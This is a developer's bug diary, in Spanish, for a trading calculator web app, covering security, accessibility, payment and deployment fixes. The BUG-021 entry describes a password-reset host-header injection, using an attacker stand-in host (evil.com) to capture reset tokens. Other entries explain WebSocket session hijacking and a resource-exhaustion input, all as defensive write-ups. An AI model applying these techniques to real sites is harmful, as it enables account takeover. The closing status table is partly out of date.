# 📋 DIARIO DE BUGS & FIXES — TradingCalculator.Pro

> **Instrucciones:** Cada entrada tiene fecha, descripción, causa raíz, solución y estado **verificado contra el código real** (no suposiciones).
>
> ⚠️ **Aviso importante (2026-06-02):** la versión anterior de este diario estaba
> desactualizada: marcaba como "SIN RESOLVER" varios bugs que el código **ya
> tenía corregidos**, y estimaba "~30% funcional" cuando la realidad es mucho
> mayor. Fue creada sin contrastar con el código. Esta versión corrige esas
> inexactitudes verificando archivo por archivo.

---

### Endurecimiento asociado (2026-08-28) — qué significan los 43 avisos de `npm audit`

`npm audit` sobre `frontend/` reportaba **44 vulnerabilidades**, y ese número
por sí solo no dice nada útil: CRA declara `react-scripts` como dependencia de
producción, así que **todo su árbol de compilación** —webpack, jest, eslint,
babel, svgo, workbox— cuenta como «producción» aunque no llegue nunca al
navegador. Repetir «44 vulnerabilidades» en cada sesión sin separarlas es
ruido que acaba tapando lo que sí importa.

Separadas, sólo cinco paquetes podían acabar en el bundle publicado. De ésos:

| Paquete | Qué se hizo |
|---|---|
| `react-router` / `-dom` 7.18.1 | **Alta** (CSRF en modo RSC). Subido a 7.18.2, que es un parche. La SPA no usa RSC, pero no hay razón para cargar con el aviso cuando el arreglo es una versión de parche |
| `dompurify` (10 avisos) | Entraba por `jspdf`, y **`jspdf` no se importa en ningún sitio**: ni en `src/`, ni en `scripts/`, ni por importación dinámica, ni aparece en el bundle. Retirada, junto a `html2canvas`, por la misma razón |
| `nanoid`, `uuid`, `qs` | Entran por `postcss` y el árbol de webpack: compilación, no navegador |

Resultado: **0 avisos que lleguen al navegador**. Los 43 restantes son del árbol
de `react-scripts` y sólo se cierran migrando de CRA a Vite —que está en el
backlog como P3, no como problema de seguridad—.

Se comprueba así, y conviene rehacerlo antes de creerse un número:

```bash
cd frontend && npm audit --json | python3 -c "…"   # separar build de runtime
grep -rl "jspdf\|dompurify" src/ scripts/          # ¿se usa de verdad?
grep -l "<paquete>" build/static/js/*.js            # ¿está en el artefacto?
```

### BUG-025 — El CSP no autorizaba `wss://`: las alertas en vivo quedaban mudas en producción
**Severidad:** 🟠 ALTA · **Archivo:** `frontend/public/index.html`, `frontend/craco.config.js` · **Estado:** ✅ RESUELTO (2026-08-28)

La Content-Security-Policy que cerró G-10 listaba el backend como
`connect-src https://api…`, y `useWebSocketAlerts` abre `wss://api…`. En CSP3
eso es **otro esquema**: la relajación va de `ws` a `http`/`https`, nunca al
revés. El navegador bloqueaba la conexión con `Refused to connect to
'ws://…/api/ws/alerts'` y las alertas de precio no llegaban nunca — en
producción, sin aviso, porque el `meta` no admite `report-only`.
**Causa raíz:** al medir los orígenes con Playwright para escribir la política,
se recorrió `/dashboard` **sin sesión**. Sin token el hook devuelve `null` y no
abre nada: el WebSocket nunca apareció en la medición.
**Solución:** `craco.config.js` deriva `REACT_APP_BACKEND_WS_URL` del backend
(no un secreto nuevo: así no puede divergir) y `connect-src` lo incluye.
**Verificado:** `pre-despliegue.js` en verde; `csp.js` gana un bloque
autenticado que exige que el WebSocket **se intente** —sin esa guarda, un
dashboard que dejara de montar `PriceAlerts` volvería a dar verde sin probar
nada— y dos sabotajes en `probar-verificadores.sh`.

### BUG-026 — Los colores de señal salían del tema oscuro: el P&L era ilegible sobre papel
**Severidad:** 🟠 ALTA · **Archivo:** `frontend/src/index.css`, 151 ficheros de `frontend/src/` · **Estado:** ✅ RESUELTO (2026-08-28)

Con el tema claro, las cifras de P&L de `/performance` medían **2,09:1** (verde)
y **3,60:1** (rojo) contra el mínimo de 4,5:1 de WCAG AA. axe encontraba 77
incumplimientos graves en esa sola pantalla con el tema claro y **1** con el
oscuro. Son los números con los que alguien dimensiona una posición real.
**Causa raíz doble:** (1) 1.499 clases llevaban el color escrito a mano —760 en
hexadecimal (`text-[#22c55e]`) y 742 de la paleta de Tailwind
(`text-red-500`)—, todas elegidas mirando el fondo oscuro; `#22c55e` resultó ser
exactamente `--long` del tema oscuro y `#ef4444` exactamente `--short`, o sea
los tokens del sistema congelados en el valor de un tema. (2) La sonda de
accesibilidad medía **un solo tema y cuatro páginas**, así que el tema claro no
existía para ella.
**Solución:** cuatro tokens nuevos (`--warn`, `--caution`, `--info`,
`--compare`) junto a `--long`/`--short`, cada uno medido para pasar 4,5:1 sobre
la tarjeta **y** como texto sobre su propio tinte al 15 %, que es el patrón de
las insignias. 1.479 clases pasan a los tokens; en oscuro el cambio es
imperceptible (7,61 → 7,54), en claro 2,19 → 4,65. Ajustados también
`--primary`, `--accent` y `--destructive` del tema claro.
**Verificado:** `accesibilidad.js` recorre ahora **2 temas × 8 páginas** — 0
incumplimientos graves en escritorio y en móvil, frente a 53 al ampliar la
cobertura.

### BUG-027 — Tres botones sin nombre accesible, y uno inalcanzable con teclado
**Severidad:** 🔴 CRÍTICA (accesibilidad) · **Archivo:** `frontend/src/pages/SettingsPage.jsx`, `frontend/src/components/education/EduAssistant.jsx` · **Estado:** ✅ RESUELTO (2026-08-28)

Los tres botones de ver/ocultar contraseña de Ajustes eran icono suelto sin
`aria-label` **y** llevaban `tabIndex={-1}`: quien navega con teclado o lector
de pantalla no podía usarlos en absoluto. El botón de preguntar de la academia
esconde su etiqueta en un `hidden sm:inline`, así que **en móvil** se quedaba
con el icono solo y sin nombre — un incumplimiento que sólo existe por debajo
del punto de ruptura, y que por eso hacía falta medir accesibilidad también en
móvil.
**Causa raíz:** iconos como única etiqueta, y `tabIndex={-1}` puesto para que el
botón no interrumpiera el tabulado del formulario.
**Solución:** `aria-label` traducido en los cuatro (claves nuevas
`showPassword`/`hidePassword` en los 10 idiomas) y `tabIndex={-1}` retirado. La
tabla comparativa de brókers gana `tabIndex={0}` + `role="region"`.
**Verificado:** `accesibilidad.js` en verde en escritorio y móvil.

### BUG-028 — La R media indefinida se pintaba «nullR»
**Severidad:** 🟡 MEDIA · **Archivo:** `frontend/src/components/performance/AnalyticsDashboard.jsx` · **Estado:** ✅ RESUELTO (2026-08-28)

Al aplicar la regla de honestidad nº 2 —lo que no se puede calcular es `None`,
no `0`— `avg_r` y el Sharpe pasaron a ser opcionales en el backend. La pantalla
seguía interpolándolos a pelo, así que pintaba `nullR` y `Sharpe: null`. Es
**peor** que el cero que se quería evitar: el cero parece un número, «null»
parece una web rota, y en la pantalla con la que alguien dimensiona una posición
se lleva por delante la confianza en el resto de las cifras.
**Causa raíz:** la regla se aplicó en el productor y no en el consumidor.
`fmtNum` ya existía en el mismo fichero para esto; esas tres cifras no lo usaban.
**Solución:** `fmtNum` en las tres. Sonda nueva `nulos.js`, que **fuerza** el
caso interceptando la respuesta de `/performance/analytics` y anulando cada
métrica que el contrato permite anular (sólo ésas: la primera versión anulaba
también `win_rate` y `expectancy`, que `_safe_div(..., 0)` nunca deja nulas, y
«encontraba» fallos de un escenario imposible).
**Verificado:** sabotaje registrado en `probar-verificadores.sh` — quitar la
guarda del bundle reproduce «AVG R nullR» y pone la sonda en rojo.

### BUG-029 — El JWT del WebSocket viajaba en la cadena de consulta
**Severidad:** 🟡 MEDIA · **Archivo:** `backend/realtime_alerts.py`, `frontend/src/hooks/useWebSocketAlerts.js` · **Estado:** ✅ RESUELTO (2026-08-28)

`useWebSocketAlerts` abría `wss://…/api/ws/alerts?token=<JWT>`. Cloud Run
registra la URL completa de cada petición, así que el token de acceso quedaba
escrito en los registros y sobrevivía allí mucho más que la hora que dura.
**Causa raíz:** el navegador no deja poner cabeceras en un WebSocket, y la URL
era el camino corto.
**Solución:** el backend prefiere la cookie `access_token` (que viaja en una
cabecera que no se registra) y conserva `?token=` como respaldo —hace falta:
la cookie es `secure` y sobre `http://localhost` el navegador no la guarda, que
es como corre el banco E2E—. El frontend intenta primero **sin** token y sólo
recurre a la URL si el servidor cierra con 4401.
⚠️ **La trampa que había que cerrar a la vez:** el apretón de manos de un
WebSocket **no pasa por CORS**. Cualquier página puede abrir uno contra el
backend y el navegador adjuntará las cookies de quien la visite. Autenticar por
cookie sin comprobar `Origin` habría abierto un secuestro de sesión entre
sitios (CSWSH) peor que el problema que se cerraba.
**Verificado:** 9 tests en `tests/test_ws_credencial_unit.py`, incluidos el
origen ajeno con la cookie de la víctima y el caso sin cabecera `Origin`. La
vía de la cookie no se puede probar en el banco E2E precisamente porque corre
sobre `http://localhost`.

### BUG-021 — Host-header injection en enlaces de email (reset de contraseña / verificación)
**Severidad:** 🔴 CRÍTICA · **Archivo:** `backend/missing_apis.py` (`forgot_password`, `send_verification_email`) · **Estado:** ✅ RESUELTO (2026-07-14)

Los endpoints `POST /auth/forgot-password` y `POST /auth/send-verification-email`
construían el enlace que se envía por email a partir de cabeceras controlables por
el atacante: `Origin` → `Referer` → `str(request.base_url)` (que deriva del header
`Host`). Un atacante podía pedir el reset del email de **otra persona** enviando
`Origin: https://evil.com`; la víctima recibía un correo legítimo con un enlace
`https://evil.com/reset-password#<token>`. Como el token viaja en la URL, la página
del atacante (JS leyendo `location.hash`) lo captura → **robo de cuenta**. En
verificación el token va en query-string, así que se filtra directamente a los logs
del atacante. Es la misma clase que el CVE `PYSEC-2026-161` de Starlette.
**Causa raíz:** confianza en `Host`/`Origin`/`Referer` para construir enlaces de
seguridad enviados por email.
**Solución:** nuevo helper `_trusted_link_base(request)` que solo devuelve el
`Origin` si está en la allow-list (misma que CORS: dominio canónico + `CORS_ORIGINS`
+ localhost en dev); en cualquier otro caso cae a `FRONTEND_URL` canónico. **Nunca**
usa `base_url`/`Referer`. El magic-link (login sin contraseña, el más peligroso) ya
era seguro porque usaba `FRONTEND_URL`.
**Verificado:** `py_compile` OK; **9 tests nuevos** en `tests/test_security_unit.py`
(origins maliciosos con trucos de sufijo/prefijo/userinfo → siempre canónico; allow-list
CORS respetada). Pendiente prueba en vivo (deploy bloqueado por facturación GCP).

### Endurecimiento asociado (2026-07-14)
- **Suite de seguridad en CI** (`tests/test_security_unit.py`, 41 tests): fuzz de inyección SQL contra el shim
  (claves whitelisted, valores parametrizados), bcrypt no reversible, host-header. Corre siempre (sufijo `_unit.py`).
- **CVEs de dependencias**: `PyJWT 2.9→2.13`, `aiohttp 3.11.10→3.14.1`, `python-multipart 0.0.12→0.0.32`,
  `python-dotenv 1.0.1→1.2.2` (50/58 CVEs que reportó `pip-audit`). `starlette` pendiente (atado a FastAPI; upgrade coordinado).

### BUG-020 — Borrar cuenta NO cancelaba la suscripción de Stripe (cobro tras baja)
**Severidad:** 🔴 CRÍTICA · **Archivo:** `backend/server.py` (`delete_account`) · **Estado:** ✅ RESUELTO (2026-07-12)

`DELETE /auth/account` borraba el usuario y sus datos pero **no cancelaba la
suscripción activa en Stripe**. Consecuencia real: quien se daba de baja seguía
siendo cobrado cada periodo porque la suscripción seguía viva en Stripe (riesgo
económico y de reclamaciones/chargebacks).
**Causa raíz:** el borrado RGPD no tocaba Stripe.
**Solución:** nuevo `_cancel_stripe_subscriptions_for_user()` que lista y cancela
las suscripciones activas del `stripe_customer_id` antes de borrar (best-effort,
nunca bloquea el borrado). Limpieza RGPD ampliada a todas las colecciones con
`user_id`. Aviso en el diálogo de borrado del front.
**Verificado:** `py_compile` OK; reutiliza el patrón `stripe.Subscription.list/delete`
ya usado en `cancel_subscription`. Pendiente prueba en vivo (deploy bloqueado por
facturación GCP).

### Mejoras de seguridad asociadas (2026-07-12)
- **Verificación de email en registro** (antes no se enviaba ni marcaba). Soft, no bloquea login.
- **2FA (TOTP) opcional** con pyotp: `/auth/2fa/*` + reto en login + gestión en Ajustes.
- **Route shadowing admin** resuelto: −20 handlers duplicados muertos en `admin_routes.py`.
- **SubscriptionPage**: `credentials:'include'` en los fetch (cookies en recarga).

---

## ✅ BUGS YA RESUELTOS EN EL CÓDIGO (el diario anterior los daba por rotos)

### BUG-001 — Demo bypass admin en store.js
**Severidad:** 🔴 CRÍTICA · **Archivo:** `frontend/src/lib/store.js` · **Estado:** ✅ RESUELTO

El bypass hardcodeado (`DEMO_USER` con `is_admin:true` inyectado si el email era
`demo@btccalc.pro`) **ya no existe**. `login()` solo autentica contra el backend.
El único resto es `DEMO_TOKEN`, que se usa para *omitir* llamadas API cuando el
backend emite un token demo — no concede privilegios en el cliente.
**Verificado:** `store.js` no contiene ningún objeto `DEMO_USER` ni bloque
`if (email === 'demo@btccalc.pro')`.

### BUG-002 — REACT_APP_BACKEND_URL en el build
**Severidad:** 🔴 CRÍTICA · **Archivos:** `store.js`, workflows · **Estado:** ✅ RESUELTO

El código ya **no genera `undefined` silencioso**: `const API = BACKEND_URL ? ... : null`
y cada acción devuelve `backendNotConfigured` si `!API`. El build de producción
inyecta `REACT_APP_BACKEND_URL` vía `deploy-gh-pages.yml`.
**Nota operativa:** que el secreto esté configurado en GitHub es responsabilidad de
despliegue, pero el código ya lo maneja con elegancia.

### BUG-003 — Stripe checkout/webhooks
**Severidad:** 🔴 CRÍTICA · **Archivo:** `backend/server.py` · **Estado:** ✅ IMPLEMENTADO EN CÓDIGO

Contrario a lo que decía el diario anterior, **los Price IDs SÍ están en el código**:
`monthly/quarterly/annual/lifetime` con `stripe_price_id: price_1TXM8...`. Existe
`POST /api/checkout/create`, `stripe.checkout.Session.create(...)` y manejo de webhook.
**Pendiente (ops, no código):** confirmar que las claves `STRIPE_API_KEY` /
`STRIPE_WEBHOOK_SECRET` y los productos están activos en el dashboard de Stripe.

### BUG-004 — Panel admin con datos "hardcodeados"
**Severidad:** 🟠 IMPORTANTE · **Archivo:** `backend/admin_routes.py` · **Estado:** ✅ RESUELTO

No hay ningún `return {"total_users": 1250}`. `GET /admin/metrics` calcula valores
**reales**: `total_users = len(all_users)`, premium/admin counts, `new_users_30d`,
MRR, breakdown por plan/proveedor/locale.
**Nota (corregida):** el backend usa **PostgreSQL (asyncpg)** con un **adaptador
hecho a mano compatible con la API de Motor/MongoDB** (`server.py:352`, "Motor-compatible
Collection wrapper over asyncpg + JSONB"). Por eso el código usa `db.users.find(...)`
estilo Mongo aunque por debajo sea SQL. (El diario anterior decía PostgreSQL a secas;
una versión intermedia de este diario dijo MongoDB — ambas imprecisas. Esta es la real.)

---

## 🟠 BUGS REALES CORREGIDOS EN ESTA SESIÓN (2026-06-02)

### BUG-009 — Dos workflows desplegando el frontend (condición de carrera) 🆕
**Severidad:** 🔴 CRÍTICA · **Archivos:** `.github/workflows/deploy-cloud-run.yml`,
`.github/workflows/deploy-gh-pages.yml` · **Estado:** ✅ RESUELTO

**Causa raíz (la "cagada" entre los dos asistentes):** dos asistentes distintos
crearon, sin coordinarse, **dos jobs que despliegan el frontend a la rama `gh-pages`**
ante el mismo evento (`push` a `main` con cambios en `frontend/**`):

- `deploy-gh-pages.yml` (correcto y completo): `REACT_APP_GOOGLE_CLIENT_ID` + analytics
  (GA4/GTM/GSC/Bing) + `PUBLIC_URL` + copia `index.html → 404.html` para rutas SPA +
  `npm ci --legacy-peer-deps`.
- `deploy-cloud-run.yml → job deploy-frontend` (añadido después, **degradado**): solo
  `REACT_APP_BACKEND_URL`, **sin** Google OAuth, **sin** analytics, **sin** `404.html`,
  `npm ci` sin `--legacy-peer-deps` y `force_orphan: true`.

Ambos corrían en paralelo y **el último en terminar sobrescribía al otro**. Si ganaba
el degradado: se rompía el login con Google, se perdían las analíticas y los enlaces
directos (`/dashboard`, etc.) devolvían 404.

**Solución aplicada:**
1. Eliminado el job `deploy-frontend` de `deploy-cloud-run.yml`.
2. `deploy-cloud-run.yml` ya **solo** se dispara con `backend/**` (responsabilidad: backend).
3. `deploy-gh-pages.yml` queda como **única** vía de despliegue del frontend.

### BUG-006 — "Olvidé mi contraseña" mentía al usuario
**Severidad:** 🟠 IMPORTANTE · **Archivo:** `frontend/src/pages/AuthPages.jsx` · **Estado:** ✅ RESUELTO

`ForgotPasswordPage` tenía un fallback que, si `!API`, hacía `setTimeout(600ms)` y
mostraba "email enviado" **sin enviar nada**. Sustituido por un error honesto
(`toast.error('Backend no configurado')`), coherente con el patrón ya usado en
`MagicPage`/`RegisterPage` del mismo archivo.

---

### BUG-010 — yfinance bloqueaba el event loop (HTTP síncrono en endpoints async) 🆕
**Severidad:** 🔴 CRÍTICA (rendimiento/escalabilidad) · **Archivo:** `backend/server.py` · **Estado:** ✅ RESUELTO (COMPLETO)

**Causa raíz:** `yfinance` hace peticiones HTTP **síncronas**. Llamarlo directamente
dentro de un `async def` **bloquea todo el event loop** mientras dura la red. En Cloud
Run con `concurrency: 80`, una sola llamada lenta congela las 80 peticiones de esa
instancia. El código ya usaba `run_in_executor` para bcrypt/Stripe/email, pero **se
olvidó de yfinance**.

**Solución aplicada:** nuevo helper `_yf_history_async()` (mismo patrón que
`hash_password_async`) + offload a thread en los **8 endpoints públicos / de más
tráfico**:
- `GET /prices` (el peor: 4 llamadas yfinance secuenciales, endpoint público del ticker)
- `GET /ohlc/{symbol}`, `POST /backtest`, `GET /iv-rank`, earnings (`.calendar`),
  `education/pattern-scan`, `market-wide-flow`.

**2ª fase (completada):** el módulo de opciones (`opt_get_stock`, `opt_search_tickers`,
`opt_get_expirations`, `opt_get_options_chain`, `opt_get_iv_surface`, `optimize_options_strategy`,
`portfolio_greeks`, `get_unusual_options`, `universal_search_tickers`, `get_iv_rank`) llamaba
funciones síncronas de `stock_data.py` directamente. Ahora **todas** las llamadas en contexto
`async` van por `await asyncio.to_thread(...)` (incluidas las que están dentro de bucles `for`
sobre expiraciones). Los helpers síncronos (`_scan_ticker_flow`, `_fetch_atm_iv_proxy`,
`_yfinance_to_ohlc_rows`) se ejecutan en thread desde su llamador async. **Cero llamadas
bloqueantes de red quedan en el event loop.**

### BUG-011 — Código muerto engañoso (módulos huérfanos) 🆕
**Severidad:** 🟡 MENOR (limpieza/confusión) · **Estado:** ✅ RESUELTO

Dos módulos que **nunca se importaban ni registraban** en `server.py` (solo se
referenciaban a sí mismos en sus docstrings) — **eliminados**:
- `backend/fixes.py` — "parches críticos" de mayo 2026 cuyo docstring decía "Uso en
  server.py: from fixes import (...)" pero **nunca se conectó**. Estaba **superado**:
  `server.py` ya sirve datos reales vía yfinance/CoinGecko.
- `backend/admin_diary_endpoint.py` — router admin para exponer este `DIARIO_BUGS.md` vía
  API, **nunca incluido**. Además habría fallado en producción: el `Dockerfile` solo copia
  `./backend`, y `DIARIO_BUGS.md` vive en la raíz del repo (no estaría en la imagen).

### BUG-012 — Adaptador SQL: LIMIT/OFFSET por interpolación (hardening) 🆕
**Severidad:** 🟢 BAJA · **Archivo:** `server.py` (`_build_query`) · **Estado:** ✅ RESUELTO

El `WHERE` ya parametrizaba valores con `$1,$2` y validaba nombres de campo con regex (✅ sin
inyección). Ahora `LIMIT`/`OFFSET` se castean explícitamente con `int(self._limit_val)` /
`int(self._skip_val)` como defensa en profundidad (antes se interpolaban directamente; el
riesgo real era nulo porque reciben ints tipados de FastAPI, pero ahora es a prueba de fallos).

---

## 🟡 PENDIENTES REALES (no son "cagadas", son mejoras de fondo)

### BUG-005 — Google OAuth: dependía del workflow degradado
**Severidad:** 🟠 IMPORTANTE · **Estado:** ✅ MITIGADO (vía BUG-009)

El código (`GoogleSignInButton.jsx`, `App.js`) ya lee `REACT_APP_GOOGLE_CLIENT_ID`
correctamente y oculta el botón si falta. El riesgo real era que el build degradado
de BUG-009 generase el bundle sin ese ID. Resuelto al eliminar ese job.
**Pendiente (ops):** tener `REACT_APP_GOOGLE_CLIENT_ID` en GitHub Secrets y la URL
autorizada en Google Console.

### BUG-007 — Preferencias de usuario solo en localStorage
**Severidad:** 🟡 MENOR → 🟠 resultó ser IMPORTANTE · **Archivo:** `frontend/src/pages/SettingsPage.jsx` y siete sitios más · **Estado:** ✅ RESUELTO (2026-08-08)

Anotado como «prioridad baja» porque parecía afectar sólo a `tcp-preferences` (dos
interruptores). Al revisarlo entero resultó que el mismo patrón ataba al navegador
**ocho** ajustes, y uno de ellos era grave: `tcp-trading-system`, los **setups
escritos a mano** por el usuario. Vaciar la caché los borraba y entrar desde el
móvil no los mostraba. Una preferencia mal guardada es una molestia; el sistema de
trading es la parte del producto que más trabajo cuesta rellenar.

**Causa raíz:** cada pantalla resolvía la persistencia por su cuenta con
`localStorage.setItem` a pelo, así que no había un sitio donde arreglarlo — había
ocho. La pantalla de Ajustes llegaba a enseñar un toast de «preferencias
guardadas» que era falso en cuanto cambiabas de equipo.

**Solución:** `frontend/src/lib/cloudPrefs.js` respalda (no sustituye)
`localStorage` contra un único documento de `user_states`. El descarte del
`PATCH /api/user/preferences` que proponía la nota original fue deliberado: habría
sido un endpoint por familia de ajuste, y `user_states` ya era un almacén
clave-valor por usuario dado de alta en las listas del RGPD.

Lo que no era obvio y costó las tres reglas del módulo: **una fecha por ajuste**
(con una sola por documento, cambiar el tema en el ordenador borraba los setups
escritos en el móvil), **un ajuste sin fecha local no se sube** (es el valor por
defecto, no una elección, y subirlo lo haría ganar a lo que sí se eligió en otro
sitio) y **el `localStorage` recuerda de qué cuenta es** (dos cuentas en el mismo
navegador es exactamente lo que ya rompió el diario legado, y aquí habría
significado subir los setups de uno a la cuenta de otro).

**Verificado:** `engine-check` +10 sobre las reglas de fusión · 12 tests nuevos de
la ruta · contra PostgreSQL real · y end-to-end en Chromium, incluido el caso de
las dos cuentas en el mismo navegador.

### BUG-007b — `POST /user-states/save` devolvía 500 por sus propias validaciones
**Severidad:** 🟡 MENOR · **Archivo:** `backend/server.py` · **Estado:** ✅ RESUELTO (2026-08-08)

Todo el cuerpo de la ruta estaba dentro de un `try` cerrado por
`except Exception → HTTPException(500)`. Como `HTTPException` es una `Exception`,
el `raise HTTPException(400, "state_id must be alphanumeric")` de dos líneas antes
lo capturaba ese mismo `except` y salía como **500**: el cliente no podía
distinguir «me has mandado basura» de «se me ha caído la base de datos», y un
reintento automático ante un 5xx era lo peor que podía hacer. Encontrado al
añadir el tope de tamaño (413), que habría heredado el mismo defecto.
**Solución:** validar fuera del `try`; el `try` envuelve sólo la escritura.

### BUG-008 — server.py monolítico (~5.500 líneas)
**Severidad:** 🟠 IMPORTANTE · **Archivo:** `backend/server.py` · **Estado:** ❌ PENDIENTE

Sigue siendo un único archivo grande. Refactor a `app/` + `routers/` recomendado.
Trabajo estimado: 4-6 h. No es una regresión; es deuda técnica pre-existente.

---

## 🔴 AUDITORÍA TÉCNICA COMPLETA — SESIÓN 2026-06-13

Auditoría de 8 fases (57 hallazgos) + implementación de correcciones.

### C-04 — app_settings Scheme A/B incompatibility (tiempo de bomba) ✅ RESUELTO
**Severidad:** 🔴 CRÍTICA · **Archivos:** `backend/admin_routes.py`, `backend/server.py`

`admin_routes.py` almacenaba settings con Scheme B `{key:"k", value:"v"}` (una fila por clave)
mientras `server.py` usaba Scheme A `{_id:"global", k1:"v1", ...}` (un doc único). Al coexistir
ambos, `_get_all_settings` hacía `d["key"]` sobre un doc Scheme A → **KeyError determinístico**
en `connectors_status`, `send_campaign`, `get_maintenance` y `gdpr_export_deliver`.

**Solución:** `_get_all_settings` → `find_one({_id:"global"})`. `_upsert_setting` → `$set` en
doc global. `_delete_setting` → `$unset` en doc global. Añadido soporte `$unset` al adaptador
JSONB (`_apply_update_operators`).

### C-06 — Cloud Run en us-central1 vs Cloud SQL en europe-west1 ✅ RESUELTO
**Severidad:** 🔴 CRÍTICA (latencia) · **Archivos:** `deploy-cloud-run.yml`, `cloudbuild.yaml`

~100-150ms de latencia por query entre regiones. Movido Cloud Run y Artifact Registry a
`europe-west1` (misma región que Cloud SQL `trading-db`) → latencia <5ms.

### C-07 — Admin puede impersonar a otro admin ✅ RESUELTO
**Severidad:** 🔴 CRÍTICA (seguridad) · **Archivo:** `backend/server.py`

`POST /admin/impersonate/{user_id}` no verificaba si el objetivo era admin. Un admin
comprometido podía escalar privilegios o cubrir rastros impersonando al superadmin.
**Solución:** comprobación `target.get("is_admin") or email in _ADMIN_EMAILS` → HTTP 403.

### A-02 — MRR con precios obsoletos (€9.99/€19.99/€79.99) ✅ RESUELTO
**Severidad:** 🟠 IMPORTANTE · **Archivo:** `backend/server.py`

`plan_mrr = {"monthly": 9.99, ...}` estaba hardcodeado con precios de una versión
anterior mientras `SUBSCRIPTION_PLANS` tiene €17/€45/€200/€500. Dashboard mostraba MRR
~6× menor al real. **Solución:** `plan_mrr` calculado dinámicamente desde `SUBSCRIPTION_PLANS`.

### A-03 — Campos /admin/revenue: backend ≠ frontend ✅ RESUELTO
**Severidad:** 🟠 IMPORTANTE · **Archivos:** `backend/server.py`, `frontend/src/pages/AdminPage.jsx`

Backend devolvía `mrr_history`/`churn_rate`/`conversion_rate`; frontend leía
`history`/`churn`/`conversion` → gráficos vacíos siempre. **Solución:** renombrar en backend.

### A-04 — Stripe SDK bloquea el event loop ✅ RESUELTO
**Severidad:** 🟠 IMPORTANTE · **Archivos:** `backend/server.py`, `backend/missing_apis.py`

9 llamadas síncronas Stripe (`Subscription.list/delete/modify`, `billing_portal.Session.create`,
`Invoice.list`, `Subscription.retrieve`, `Price.create`) dentro de `async def` → congelaban el
event loop 3-5s cada vez. Todas envueltas en `asyncio.to_thread`.

### A-05 — SendGrid sg.send() bloquea el event loop ✅ RESUELTO
**Severidad:** 🟠 IMPORTANTE · **Archivo:** `backend/server.py`

`sg.send(message)` → `await asyncio.to_thread(sg.send, message)`.

### A-06 — Sin validación de longitud de contraseña ✅ RESUELTO
**Severidad:** 🟠 IMPORTANTE · **Archivo:** `backend/server.py`

`UserCreate.password: str` sin restricciones → contraseñas de 1 carácter aceptadas.
**Solución:** `Field(..., min_length=8, max_length=128)`.

### A-07 — DoS en /monte-carlo vía numSimulations enorme ✅ RESUELTO
**Severidad:** 🟠 IMPORTANTE · **Archivo:** `backend/server.py`

`numSimulations=9999999` consumía CPU/RAM hasta matar el worker. **Solución:** caps
`numTrades ≤ 1000`, `numSimulations ≤ 5000`.

### A-09 — revoked_tokens crece sin límite ✅ RESUELTO
**Severidad:** 🟡 MENOR · **Archivo:** `backend/server.py`

Tokens revocados nunca se purgaban. **Solución:** `delete_many({expires_at: {$lt: now}})`
en `startup_event` — los tokens con JWT expirado no pueden usarse igualmente.

### A-10 — Dockerfile ejecuta uvicorn como root ✅ RESUELTO
**Severidad:** 🟠 IMPORTANTE · **Archivo:** `backend/Dockerfile`

Breach de proceso → acceso root al sistema de archivos del contenedor.
**Solución:** `RUN adduser appuser` + `USER appuser` antes de `EXPOSE`.

### M-13 — /api/health devuelve 200 cuando la DB está caída ✅ RESUELTO
**Severidad:** 🟠 IMPORTANTE · **Archivo:** `backend/server.py`

Cloud Run probes usaban HTTP status; `{"status":"degraded"}` con HTTP 200 nunca
activaba el circuit breaker. **Solución:** `raise HTTPException(503)` cuando DB no responde.

### M-14 — ADMIN_EMAILS hardcodeado en cloudbuild.yaml ✅ RESUELTO
**Severidad:** 🟡 MENOR · **Archivo:** `cloudbuild.yaml`

Email de admin (`tradingcalculatorpro@gmail.com`) expuesto en el repositorio.
**Solución:** eliminado del `--set-env-vars`; debe configurarse en el servicio Cloud Run.

### M-19 — POST /referrals/track sin rate limit ✅ RESUELTO
**Severidad:** 🟡 MENOR · **Archivo:** `backend/referrals.py`

Endpoint público sin autenticación ni límite → enumeración de emails (404 vs 200).
**Solución:** `limiter.limit("5/minute")` inyectado vía `helpers["limiter"]` en `register()`.

### LTV — Fórmula algebraicamente nula ✅ RESUELTO
**Severidad:** 🟡 MENOR · **Archivo:** `backend/server.py`

`price * max(count,1) / max(count,1)` ≡ `price` (el count se cancelaba). Simplificado
a `round(plan["price"], 2)` con comentario explicativo.

---

## 🟡 PENDIENTES CONOCIDOS (no bloquean operación)

- **BUG-007** — Preferencias de usuario solo en localStorage (baja prioridad)
- **BUG-008** — `server.py` monolítico ~5.500 líneas (deuda técnica, requiere tests)
- **C-08** — API keys (Stripe/SendGrid) pueden almacenarse en `app_settings` DB en plaintext.
  Arquitectónicamente: las claves deberían ir solo como Cloud Run secrets. El panel admin
  no debería tener un campo para sobreescribirlas vía DB. Requiere decisión de producto.
- **Sombra de rutas** — ~21 endpoints de `admin_routes.py` son código muerto porque
  `server.py` registra las mismas rutas primero (FastAPI first-match). Requiere refactor
  mayor para unificar en un solo router.

---

## 📊 RESUMEN DE ESTADO (verificado 2026-06-13)

| Bug | Descripción | Severidad | Estado real |
|-----|-------------|-----------|-------------|
| BUG-001 | Demo bypass admin | 🔴 | ✅ Resuelto (en código) |
| BUG-002 | REACT_APP_BACKEND_URL | 🔴 | ✅ Resuelto (en código) |
| BUG-003 | Stripe checkout/webhooks | 🔴 | ✅ Implementado (falta verificar dashboard) |
| BUG-004 | Admin con datos falsos | 🟠 | ✅ Resuelto (queries reales) |
| BUG-005 | Google OAuth | 🟠 | ✅ Mitigado (vía BUG-009) |
| BUG-006 | Forgot password mentía | 🟠 | ✅ Resuelto (sesión anterior) |
| BUG-007 | Preferencias en localStorage | 🟡 | ❌ Pendiente (baja prioridad) |
| BUG-008 | server.py monolítico | 🟠 | ❌ Pendiente (deuda técnica) |
| BUG-009 | Workflows de deploy en carrera | 🔴 | ✅ Resuelto (sesión anterior) |
| BUG-010 | yfinance bloqueaba el event loop | 🔴 | ✅ Resuelto (COMPLETO) |
| BUG-011 | Código muerto (fixes.py, admin_diary_endpoint.py) | 🟡 | ✅ Resuelto (eliminados) |
| BUG-012 | LIMIT/OFFSET por interpolación | 🟢 | ✅ Resuelto (cast a int) |
| C-04 | app_settings Scheme A/B → KeyError | 🔴 | ✅ Resuelto (sesión 2026-06-13) |
| C-06 | Cloud Run us-central1 ↔ Cloud SQL europe-west1 | 🔴 | ✅ Resuelto (sesión 2026-06-13) |
| C-07 | Admin impersona otro admin | 🔴 | ✅ Resuelto (sesión 2026-06-13) |
| A-02 | MRR con precios obsoletos | 🟠 | ✅ Resuelto (sesión 2026-06-13) |
